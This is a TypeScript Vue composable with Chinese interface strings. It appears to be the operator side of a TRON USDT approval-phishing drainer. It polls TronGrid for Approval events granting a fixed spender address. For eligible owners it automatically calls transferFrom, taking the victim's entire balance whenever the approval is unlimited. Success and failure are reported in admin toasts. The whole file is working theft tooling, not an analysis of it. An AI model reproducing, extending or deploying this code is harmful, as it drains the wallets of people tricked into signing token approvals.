import { storeToRefs } from 'pinia'
import { computed, onUnmounted, ref } from 'vue'
import { useToast } from 'primevue/usetoast'

import { fetchApprovalEvents } from '@/api/tron-grid-api'
import { useTronWallet } from '@/composables/use-tron-wallet'
import {
  formatTronUsdtAmount,
  isUnlimitedApproval,
  parseTronUsdtAmount,
  readTrc20Allowance,
  readTrc20Balance,
  sendTrc20TransferFrom,
} from '@/contracts/trc20-contract'
import { TRON_SPENDER_ADDRESS } from '@/config/tron'
import { useAdminStore } from '@/stores/admin-store'
import type { ApprovalRecord, TronGridApprovalEvent } from '@/types/admin-types'
import { mapTronErrorMessage } from '@/utils/tron-error-util'
import {
  canExecuteTransfer,
  getReadOnlyTronWeb,
  getSignTronWeb,
  getTransferBlockedReason,
  hasAdminSigner,
  isWalletMatchedSpender,
  normalizeTronAddress,
} from '@/utils/tron-admin-util'
import { waitForTronTransaction } from '@/utils/tron-util'

export function useTronApprovalMonitor() {
  const adminStore = useAdminStore()
  const toast = useToast()
  const wallet = useTronWallet()
  const {
    settings,
    approvals,
    isMonitoring,
    lastPollAt,
    lastError,
    lastBlockTimestamp,
  } = storeToRefs(adminStore)

  const spenderAddress = computed(() => TRON_SPENDER_ADDRESS)
  const canTransfer = computed(() => canExecuteTransfer(wallet.address.value))
  const transferBlockedReason = computed(() => getTransferBlockedReason(wallet.address.value))
  const isWalletReady = computed(() => isWalletMatchedSpender(wallet.address.value))

  const pollTimer = ref<number | null>(null)
  const isBootstrapping = ref(false)

  function buildRecordId(txId: string): string {
    return txId
  }

  function mapEventToRecord(event: TronGridApprovalEvent): ApprovalRecord | null {
    const owner = normalizeTronAddress(event.result.owner ?? event.result['0'] ?? '')
    const spender = normalizeTronAddress(event.result.spender ?? event.result['1'] ?? '')
    const rawValue = event.result.value ?? event.result['2'] ?? '0'

    if (!owner || spender !== TRON_SPENDER_ADDRESS) {
      return null
    }

    const amount = BigInt(rawValue)
    const unlimited = isUnlimitedApproval(amount)

    return {
      id: buildRecordId(event.transaction_id),
      txId: event.transaction_id,
      blockTimestamp: event.block_timestamp,
      owner,
      spender,
      amount,
      amountLabel: unlimited ? '无限授权' : formatTronUsdtAmount(amount),
      isUnlimitedApproval: unlimited,
      transferStatus: 'detected',
      detectedAt: Date.now(),
    }
  }

  function isAmountInConfiguredRange(amount: bigint): boolean {
    const min = parseTronUsdtAmount(settings.value.minAmount)
    const max = parseTronUsdtAmount(settings.value.maxAmount)
    return amount >= min && amount <= max
  }

  async function resolveTransferAmount(
    owner: string,
    approvedAmount: bigint,
    isUnlimited: boolean,
  ): Promise<bigint | null> {
    const tronWeb = getReadOnlyTronWeb()

    const balance = await readTrc20Balance(tronWeb, owner)
    if (balance <= 0n) return null

    const allowance = await readTrc20Allowance(tronWeb, owner)
    if (allowance <= 0n) return null

    const effectiveAmount = isUnlimited ? balance : approvedAmount
    if (!isAmountInConfiguredRange(effectiveAmount)) {
      return null
    }

    return effectiveAmount > balance
      ? balance
      : effectiveAmount > allowance
        ? allowance
        : effectiveAmount
  }

  async function executeTransfer(record: ApprovalRecord): Promise<void> {
    if (adminStore.isTransferring(record.id)) return

    const blockedReason = getTransferBlockedReason(wallet.address.value)
    if (blockedReason) {
      adminStore.updateApproval(record.id, {
        transferStatus: 'failed',
        transferError: blockedReason,
      })
      return
    }

    const tronWeb = getSignTronWeb(wallet.tronWeb.value, wallet.address.value)
    if (!tronWeb) {
      adminStore.updateApproval(record.id, {
        transferStatus: 'failed',
        transferError: '无法获取签名 TronWeb 实例',
      })
      return
    }

    adminStore.setTransferring(record.id, true)
    adminStore.updateApproval(record.id, {
      transferStatus: 'transferring',
      transferError: undefined,
    })

    try {
      const transferAmount = await resolveTransferAmount(
        record.owner,
        record.amount,
        record.isUnlimitedApproval,
      )

      if (!transferAmount || transferAmount <= 0n) {
        adminStore.updateApproval(record.id, {
          transferStatus: 'skipped',
          transferError: '授权金额不在区间或余额/额度不足',
        })
        return
      }

      const txId = await sendTrc20TransferFrom(
        tronWeb,
        record.owner,
        spenderAddress.value,
        transferAmount,
      )

      adminStore.updateApproval(record.id, { transferTxId: txId })

      const receipt = await waitForTronTransaction(tronWeb, txId)
      if (receipt.receipt?.result && receipt.receipt.result !== 'SUCCESS') {
        throw new Error(`交易失败：${receipt.receipt.result}`)
      }

      adminStore.updateApproval(record.id, {
        transferStatus: 'transferred',
        transferError: undefined,
      })
      adminStore.markProcessed(record.txId)

      toast.add({
        severity: 'success',
        summary: '转账成功',
        detail: `${record.owner} → ${formatTronUsdtAmount(transferAmount)}`,
        life: 5000,
      })
    } catch (error) {
      const message = mapTronErrorMessage(error)
      adminStore.updateApproval(record.id, {
        transferStatus: 'failed',
        transferError: message,
      })
      toast.add({
        severity: 'error',
        summary: '转账失败',
        detail: message,
        life: 6000,
      })
    } finally {
      adminStore.setTransferring(record.id, false)
    }
  }

  async function handleNewRecord(record: ApprovalRecord) {
    adminStore.upsertApproval(record)

    const eligible = record.isUnlimitedApproval
      ? true
      : isAmountInConfiguredRange(record.amount)

    if (!eligible) {
      adminStore.updateApproval(record.id, { transferStatus: 'skipped' })
      return
    }

    adminStore.updateApproval(record.id, { transferStatus: 'eligible' })

    if (!settings.value.autoTransferEnabled) return
    if (adminStore.hasProcessed(record.txId)) return
    if (!canExecuteTransfer(wallet.address.value) && !hasAdminSigner()) return

    await executeTransfer(record)
  }

  async function pollOnce(): Promise<void> {
    const minTimestamp = lastBlockTimestamp.value > 0
      ? lastBlockTimestamp.value + 1
      : undefined

    let fingerprint: string | undefined
    let latestTimestamp = lastBlockTimestamp.value

    do {
      const { events, fingerprint: nextFingerprint } = await fetchApprovalEvents({
        minBlockTimestamp: minTimestamp,
        fingerprint,
        limit: 200,
      })

      for (const event of events) {
        const record = mapEventToRecord(event)
        if (!record) continue

        if (event.block_timestamp > latestTimestamp) {
          latestTimestamp = event.block_timestamp
        }

        if (adminStore.hasProcessed(record.txId)) {
          adminStore.upsertApproval({
            ...record,
            transferStatus: 'transferred',
          })
          continue
        }

        const existing = approvals.value.find((item) => item.id === record.id)
        if (existing) continue

        await handleNewRecord(record)
      }

      fingerprint = nextFingerprint
    } while (fingerprint)

    if (latestTimestamp > lastBlockTimestamp.value) {
      adminStore.persistLastTimestamp(latestTimestamp)
    }

    adminStore.setLastPollAt(Date.now())
    adminStore.setLastError('')
  }

  async function bootstrapHistory(): Promise<void> {
    if (isBootstrapping.value) return
    isBootstrapping.value = true

    try {
      const { events } = await fetchApprovalEvents({ limit: 50 })
      const sorted = [...events].sort((a, b) => b.block_timestamp - a.block_timestamp)

      for (const event of sorted) {
        const record = mapEventToRecord(event)
        if (!record) continue

        const eligible = record.isUnlimitedApproval
          ? true
          : isAmountInConfiguredRange(record.amount)

        adminStore.upsertApproval({
          ...record,
          transferStatus: adminStore.hasProcessed(record.txId)
            ? 'transferred'
            : eligible
              ? 'eligible'
              : 'skipped',
        })
      }
    } catch (error) {
      adminStore.setLastError(mapTronErrorMessage(error))
    } finally {
      isBootstrapping.value = false
    }
  }

  function stopMonitoring() {
    if (pollTimer.value !== null) {
      window.clearInterval(pollTimer.value)
      pollTimer.value = null
    }
    adminStore.setMonitoring(false)
  }

  async function startMonitoring() {
    stopMonitoring()
    adminStore.setMonitoring(true)

    try {
      await pollOnce()
    } catch (error) {
      adminStore.setLastError(mapTronErrorMessage(error))
    }

    pollTimer.value = window.setInterval(() => {
      void pollOnce().catch((error) => {
        adminStore.setLastError(mapTronErrorMessage(error))
      })
    }, settings.value.pollIntervalMs)
  }

  async function manualTransfer(record: ApprovalRecord) {
    await executeTransfer(record)
  }

  onUnmounted(() => {
    stopMonitoring()
  })

  return {
    settings,
    approvals,
    isMonitoring,
    lastPollAt,
    lastError,
    lastBlockTimestamp,
    spenderAddress,
    canTransfer,
    transferBlockedReason,
    isWalletReady,
    wallet,
    isBootstrapping,
    hasAdminSigner,
    bootstrapHistory,
    startMonitoring,
    stopMonitoring,
    manualTransfer,
    pollOnce,
  }
}
